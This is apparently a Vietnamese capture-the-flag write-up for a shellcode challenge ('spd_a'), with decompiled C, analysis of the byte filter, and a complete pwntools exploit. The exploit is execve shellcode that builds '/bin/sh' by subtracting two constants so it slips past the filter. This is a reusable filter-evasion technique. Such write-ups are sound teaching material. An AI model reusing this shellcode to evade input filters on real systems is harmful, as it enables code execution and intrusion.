# spd_a_cc30fab6

**1 chall khá nặng về asm** 

## ida
```c 
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+8h] [rbp-58h]
  int v5; // [rsp+Ch] [rbp-54h]
  void *addr; // [rsp+10h] [rbp-50h] BYREF
  void *buf; // [rsp+18h] [rbp-48h]
  _BYTE *v8; // [rsp+20h] [rbp-40h]
  unsigned __int64 v9; // [rsp+28h] [rbp-38h]

  v9 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  signal(14, done);
  alarm(0x3Cu);
  banner();
  if ( getrandom(&addr, 8LL, 1LL) == 8 )
  {
    addr = (void *)((unsigned __int64)addr & 0x7FFFFFFFF000LL);
    buf = mmap(addr, 0x1000uLL, 3, 50, -1, 0LL);
    if ( buf == (void *)-1LL )
    {
      perror("mmap failed, addr");
      return 1;
    }
    else
    {
      printf("c0de: ");
      v5 = read(0, buf, 0x1000uLL);
      if ( v5 >= 0 )
      {
        v8 = buf;
        for ( i = 0; i < v5; ++i )
        {
          if ( v8[i] == '/'
            || v8[i] == 98 && v8[i + 1] == 105 && v8[i + 2] == 110
            || v8[i] == 115 && v8[i + 1] == 104
            || !v8[i] )
          {
            puts("nope");
            return 1;
          }
        }
        if ( mprotect(buf, 0x1000uLL, 5) == -1 )
        {
          perror("mprotect failed");
          return 1;
        }
        else
        {
          return -1;
        }
      }
      else
      {
        perror("read failed");
        return 1;
      }
    }
  }
  else
  {
    perror("getrandom failed");
    return 1;
  }
}
```

**checks:**

![image](https://github.com/gookoosss/CTF/assets/128712571/ea79ae92-25e6-4ad3-a559-f4eafb983ed2)



**chà chà full tank à :))**

sau gần 2 tiếng đọc ida và chạy thử chall thì mình vẫn ko biết bug ở đâu để khai thác :)) 

sau khi được hint thì mình nhận ra **bug nhằm ở sự khác nhau giữa return 1 và return -1:**

- **return 1:**

![image](https://github.com/gookoosss/CTF/assets/128712571/4de4f941-edb3-4329-9f92-500dcac21752)


khi nó đến ret nó sẽ **trỏ đến địa chỉ libc_start_main và ta chả khai thác được gì**

- **return -1:**

![image](https://github.com/gookoosss/CTF/assets/128712571/8503e4d3-221c-4e81-a431-674d4e778863)



return -1 rất lạ, **khi chuẩn bị ret thì nó sẽ xóa gần hết các thanh ghi mà chỉ để lại mỗi thanh ghi rsi và rbp, đến khi ret thì nó sẽ chạy shellcode nếu ta nhập vào**

![image](https://github.com/gookoosss/CTF/assets/128712571/c2e42447-33eb-46cd-8d2d-ada7c41fc8ca)



khá đặc biệt phải không

## Phân tích

đến đây ta phân tích ida để nhập shellcode:

- ở đây không có **lớp bảo mật seccomp** nên sẽ không giới hạn cái syscall ta sử dụng
- **vấn đề nhằm ở đây:** 

```c
for ( i = 0; i < v5; ++i )
        {
          if ( v8[i] == '/'
            || v8[i] == 98 && v8[i + 1] == 105 && v8[i + 2] == 110
            || v8[i] == 115 && v8[i + 1] == 104
            || !v8[i] )
          {
            puts("nope");
            return 1;
          }
        }
```

- tại đây chương trình sẽ **check toàn bộ giá trị ta nhập vào, nếu có các kí tự '/', 'bin', 'sh', '\0' thì sẽ dừng và trả về return 1**, mà return 1 thì ta ko chạy shell được
- bây giờ ta gặp khó vì cần thực thi **syscall execute()** mà lại không thể không thể nhập **/bin/sh\0** vào được

sau khi được hint lần nữa thì mình đã nghĩ ra cách làm khá hay đó là n**hập 8byte bất kì tránh các từ '/', 'bin', 'sh', '\0'** sau đó **tính offset đến /bin/sh\0  rồi trừ ra** là ta có thể **có được /bin/sh\0 mà không cần nhập /bin/sh\0 rồi** 

![image](https://github.com/gookoosss/CTF/assets/128712571/c6454feb-1fa0-49a2-9c9a-55320c722116)


ở đây thì mình chọn **8byte a**

giờ thì viết shellcode thôi :

```python 
shellcode = asm(
    '''
    mov rax , 7016996765293437281    ;aaaaaaaa
    mov rbx , 6987596720162471730    ;offset
    sub rax , rbx                    ;/bin/sh\0
    push rax

    mov rdi, rsp
    xor rsi , rsi
    xor rdx , rdx
    xor rax, rax
    add rax , 0x3b
    syscall

    ''', arch = 'amd64'
)
```

chạy thử xem sao nào

![image](https://github.com/gookoosss/CTF/assets/128712571/d8b17454-2691-49ec-8786-071454e28ead)


và thế là ta đã lấy được shell

## script

```python 
from pwn import *

context.binary = exe = ELF('./spd_a')
p = process(exe.path)

gdb.attach(p, gdbscript = '''
b*main+327
b*main+628
c        
''')

input()

shellcode = asm(
    '''
    mov rax , 7016996765293437281 
    mov rbx , 6987596720162471730
    sub rax , rbx
    push rax

    mov rdi, rsp
    xor rsi , rsi
    xor rdx , rdx
    xor rax, rax
    add rax , 0x3b
    syscall

    ''', arch = 'amd64'
)

p.sendafter(b'c0de: ', shellcode)


p.interactive()

```





